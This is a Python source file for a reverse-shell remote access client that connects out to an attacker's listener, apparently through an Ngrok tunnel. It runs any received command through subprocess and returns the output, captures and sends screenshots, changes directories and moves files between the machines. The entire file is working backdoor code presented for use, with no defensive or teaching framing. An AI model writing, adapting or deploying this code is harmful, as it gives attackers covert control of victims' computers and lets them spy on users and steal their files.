import socket
import subprocess
from PIL import ImageGrab
import os

def connect_to_listener(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    while True:
        command = client.recv(4096).decode()

        if command.lower() == "exit":
            break

        if command.lower() == "screenshot":
            send_screenshot(client)
        elif command.lower() == "upload":
            send_files(client)
        elif command.lower() == "download":
            client.send(command.encode())
            download_file(client)
        elif command.lower().startswith("cd"):
            location = command[3::]
            if os.path.exists(location):
                os.chdir(location)
                client.send("Done ...".encode())
            else:
                client.send("This Location Not Found".encode())
        else:
            output = subprocess.getoutput(command)
            client.send(output.encode())

    client.close()

def send_screenshot(client):
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.jpg", "JPEG")

    with open("screenshot.jpg", "rb") as file:
        data = file.read(4096)
        while data:
            client.send(data)
            data = file.read(4096)

    client.send(b"DONE")
    print("[*] 🖼️ Screenshot sent")

def send_files(client):
    file_paths = input("💾 Enter the file path(s) to upload (separated by spaces): ").split()

    client.send(str(len(file_paths)).encode())

    for file_path in file_paths:
        if os.path.isfile(file_path):
            client.send(file_path.encode())

            with open(file_path, "rb") as file:
                data = file.read(4096)
                while data:
                    client.send(data)
                    data = file.read(4096)

            client.send(b"DONE")
            print(f"[*] File '{os.path.basename(file_path)}' uploaded successfully")
        else:
            print(f"[!] File '{file_path}' does not exist")

def download_file(client):
    file_name = input("💾 Enter the file name to download: ")
    client.send(file_name.encode())

    response = client.recv(4096).decode()
    if response == "FILE_NOT_FOUND":
        print("[!] File not found on the remote machine")
    else:
        with open(file_name, "wb") as file:
            while True:
                data = client.recv(4096)
                if data == b"DONE":
                    break
                file.write(data)

        print(f"[*] 📥 File '{file_name}' downloaded successfully")

if __name__ == "__main__":
    host = "host"  # Replace with your Ngrok tunnel URL
    port = 1234  # Replace with your listener's port number
    connect_to_listener(host, port)
